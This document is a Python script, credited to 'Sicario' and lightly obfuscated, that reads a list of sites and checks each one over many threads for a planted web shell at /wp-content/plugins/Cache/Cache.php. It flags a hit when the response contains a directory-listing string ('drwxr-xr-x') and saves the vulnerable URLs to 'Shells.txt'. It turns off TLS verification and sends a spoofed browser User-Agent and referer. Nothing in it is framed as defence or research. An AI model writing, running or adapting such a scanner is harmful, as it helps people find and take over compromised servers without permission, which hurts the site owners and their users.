import sys
import requests as C
import re
from multiprocessing.dummy import Pool
from colorama import Fore as A
from colorama import init
from pathlib import Path
import time
import platform
import os
import hashlib
from datetime import datetime

N = 'clear'
M = input
G = 'https://'
F = 'http://'
E = True
B = print

os.system(N)
init(autoreset=E)

H = A.RED
O = A.CYAN
U = A.WHITE
I = A.GREEN
V = A.MAGENTA

os.system('cls' if os.name == 'nt' else N)

B('''
###################################                                  
#   WordPess Cache Plugins        #  
#  [Code By :: Sicario ᕦ(ò_óˇ)ᕤ] #  
##################################   

''')

C.urllib3.disable_warnings()

J = {
    'Connection': 'keep-alive',
    'Cache-Control': 'max-age=0',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Linux; Android 7.0; SM-G892A Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Mobile Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
    'referer': 'www.google.com'
}

try:
    P = M('Site Lists: ')
    Q = Path(__file__).with_name(P)
    R = [A.strip() for A in Q.open('r').readlines()]
except IndexError:
    K = str(sys.argv[0]).split('\\')
    exit('\n\x1b[1;31m  [!] Enter <' + K[len(K)-1] + '> <your list.txt>')

S = int(M('Threads: '))

def L(site):
    A = site
    if A.startswith(F):
        A = A.replace(F, '')
    elif A.startswith(G):
        A = A.replace(G, '')
    else:
        return A
    B = re.compile('(.*)/')
    while re.findall(B, A):
        C = re.findall(B, A)
        A = C[0]
    return A

def T(url):
    R = '/wp-content/plugins/Cache/Cache.php\n'
    Q = 'Shells.txt'
    P = ' --> {}[Found]'
    O = '\x1b[0;32m[X]'
    N = 'utf-8'
    M = 'drwxr-xr-x'
    K = '/wp-content/plugins/Cache/Cache.php'
    A = url
    try:
        A = F + L(A)
        D = C.get(A + K, headers=J, allow_redirects=E, timeout=7)
        if M in D.content.decode(N):
            B(O + A + P.format(I))
            open(Q, 'a').write(A + R)
        else:
            A = G + L(A)
            D = C.get(A + K, headers=J, allow_redirects=E, verify=False, timeout=7)
            if M in D.content.decode(N):
                B(O + A + P.format(I))
                open(Q, 'a').write(A + R)
            else:
                B('[X]' + A + ' --> {}[Not Found]'.format(H))
    except:
        B('\x1b[0;31mDNS Error-->' + A + ' --> {}[No Response]'.format(H))

D = Pool(S)
D.map(T, R)
D.close()
D.join()

B('\n [!] {}WP Cache Plugins By Sicario'.format(O))

